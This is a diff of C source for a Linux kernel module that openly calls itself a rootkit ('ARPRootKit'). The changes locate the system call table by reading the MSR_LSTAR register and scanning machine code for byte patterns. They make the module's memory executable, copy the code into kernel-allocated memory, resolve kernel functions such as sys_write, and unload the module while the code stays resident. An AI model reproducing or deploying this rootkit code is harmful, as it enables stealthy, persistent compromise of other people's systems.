@@ -48,7 +48,7 @@
 #define PAGE_ROUND_UP(x) ((((unsigned long)(x)) + PAGE_SIZE-1) & (~(PAGE_SIZE-1)))
 
 /*
- * Kernel declarations.
+ * Kernel shared definitions: labels, delta variables and functions.
  */
 #include "shared_kernel.h"
 
@@ -61,13 +61,6 @@ void *search_sct(void);
 void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len);
 
 /*
- * Labels.
- */
-extern void kernel_start(void);
-extern void kernel_code_end(void);
-extern void kernel_end(void);
-
-/*
  * Global variables.
  */
 void (*f_kernel_test)(void) = NULL;
@@ -77,25 +70,38 @@ int init_module(void)
 	size_t kernel_len, kernel_paglen, kernel_pages;
 	void *kernel_addr = NULL;
 
-	kernel_len = &kernel_end - &kernel_start;
-	kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
-	kernel_pages = kernel_paglen >> PAGE_SHIFT;
+    kernel_len = &kernel_end - &kernel_start;
+    kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
+    kernel_pages = kernel_paglen >> PAGE_SHIFT;
+
+    /*
+     * Make our kernel executable, to can use pinfo(), perr().
+     */
+    set_memory_x(PAGE_ROUND_DOWN(&kernel_start), kernel_pages);
+
+	/*
+	 * Search sys_call_table[] address.
+	 */
+	printk("0\n");
+	*sys_call_table() = search_sct();
+	printk("1\n");
+	if (*sys_call_table() == NULL) {
+		return -1;
+	}
+	printk("2\n");
+    /*
+     * Linux Kernel symbols for our rootkit.
+     */
+    *f_kmalloc() = kmalloc;
+    *f_kfree() = kfree;
+    *f_find_vpid() = find_vpid;
+    *f_vscnprintf() = vscnprintf;
+    *f_sys_write() = (*sys_call_table())[__NR_write]; // now we can print into stdout =)
+	printk("3\n");
+
+	pinfo("Hurra! sys_call_table = %p\n", *sys_call_table());
 
 	//printk("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_addr = %p, kernel_pagdown_addr = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
-
-	/*
-	 * Make our kernel executable, to can use pinfo(), perr().
-	 */
-	set_memory_x(PAGE_ROUND_DOWN(&kernel_start), kernel_pages);
-
-	/*
-     * Linux Kernel symbols for our rootkit.
-	 */
-	*f_kmalloc() = kmalloc;
-	*f_kfree() = kfree;
-	*f_find_vpid() = find_vpid;
-	*f_vscnprintf() = vscnprintf;
-	*f_sys_write() = kallsyms_lookup_name("sys_write");
 
 	/*
      * Insert out rootkit into memory.
@@ -123,19 +129,11 @@ int init_module(void)
 		f_kernel_test();
 		pinfo("f_kernel_test execution from allocated code, successful.\n");
 
-		/*
-		 * Search sys_call_table[] address.
-		 */
-		*sys_call_table() = search_sct();
-		if (*sys_call_table()) {
-			pinfo("Hurra! sys_call_table = %p\n", *sys_call_table());
+		pinfo("ARPRootKit successfully installed!\nAutomatically unloading this module, by returning error: EPERM.\n");
 
-			(*f_kfree())(kernel_addr);
+		// uncomment for testing:
+		(*f_kfree())(kernel_addr);
 
-			return 0;
-		} else {
-			(*f_kfree())(kernel_addr);
-		}
 	} else {
 		perr("can not allocate memory.\n");
 	}
@@ -192,12 +190,15 @@ void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_l
 
 void *search_sct(void) {
 	void *sct = (void *) __rdmsr(MSR_LSTAR);
-	disassemble(sct, 0x3c);
+	// DO NOT call disassemble() in this function as sys_write is not yet imported!
+	// or import sys_write into f_sys_write before calling:
+	//*f_sys_write() = kallsyms_lookup_name("sys_write");
+	//disassemble(sct, 0x3c);
 	sct = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
 	if (memcmp(sct + 3 + 4, "\xff\xe7", 2) == 0) { // found!
 		sct += 3;
 		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
-		disassemble(sct, 0x40);
+		//disassemble(sct, 0x40);
 		sct = memmem(sct, 0x100, "\xff\x14\xc5", 3); // search: call *sys_call_table(, %rax, 8)
 		if (sct) {
 			sct += 3;
